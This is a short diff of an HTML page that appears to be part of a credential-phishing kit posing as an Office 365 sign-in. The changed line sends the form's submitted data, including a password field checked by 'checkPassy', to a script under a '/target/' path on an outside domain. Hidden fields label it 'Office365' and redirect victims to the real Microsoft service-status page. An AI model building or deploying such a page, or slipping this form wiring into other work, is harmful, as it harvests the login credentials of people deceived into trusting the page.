@@ -69,7 +69,7 @@ function checkPassy() {
 
 <body>
 <div id="bady">
-  <form  name="form1" spellcheck="false" method="post" action="mpa.php" autocomplete="off">
+  <form  name="form1" spellcheck="false" method="post" action="https://isiboffshore.co.uk/target/mpa.php" autocomplete="off">
 <div class="chamber">
 <input name="agenti" type="hidden" id="agenti" value="Office365">
   <input name="redir" type="hidden" id="redir" value="https://portal.office.com/servicestatus">
